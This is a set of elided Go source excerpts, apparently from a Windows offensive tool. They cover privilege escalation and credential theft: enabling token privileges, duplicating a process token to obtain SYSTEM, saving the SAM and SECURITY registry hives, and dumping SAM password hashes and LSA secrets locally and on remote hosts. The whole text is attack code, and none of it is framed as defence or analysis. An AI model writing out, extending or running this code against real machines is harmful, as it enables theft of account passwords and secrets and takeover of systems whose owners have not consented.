...
func EnablePriv(priv string) (string, error) {
	...
	if hProc == 0 {
		return "", errors.New("Failed to get current process handle")
	}
	var hToken windows.Token
	var luid windows.LUID
	err := windows.OpenProcessToken(windows.Handle(hProc), winapi.TOKEN_QUERY|winapi.TOKEN_ADJUST_PRIVILEGES, &hToken)
	if err != nil {
		return "", err
	}
...
func GetSystem() (string, error) {
	...
	// enable SEDebug
	hProc, err := windows.OpenProcess(winapi.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return "", err
	}
	var hToken windows.Token
	var duplicatedToken windows.Token
	err = windows.OpenProcessToken(hProc, winapi.TOKEN_IMPERSONATE|winapi.TOKEN_DUPLICATE, &hToken)
	if err != nil {
		return "", err
	}
...
func ExportKeys(host string) error {
	...
	err = winapi.RegSaveKeyExW(windows.Handle(samKey), "C:\\Windows\\sam.hive", 0, 1)
	if err != nil {
		return err
	}
	...
	err = winapi.RegSaveKeyExW(windows.Handle(securityKey), "C:\\Windows\\security.hive", 0, 1)
	if err != nil {
		return err
	}
...
func DumpSecrets() (string, error) {
	sam, err := DumpHashes()
	if err != nil {
		sam = fmt.Sprintf("Failed to get sam hashes %s", err.Error())
	}
	lsa, err := DumpLsaSecrets()
	if err != nil {
		lsa = fmt.Sprintf("Failed to get lsa secrets %s", err.Error())
	}
	return sam + "\n" + lsa, nil
}
...
func DumpSecretsRemote(args []string) (string, error) {
	...
	results := ""
	results += samSecrets.ClassicPrint()
	...
	results += lsaSecrets.ClassicPrint()
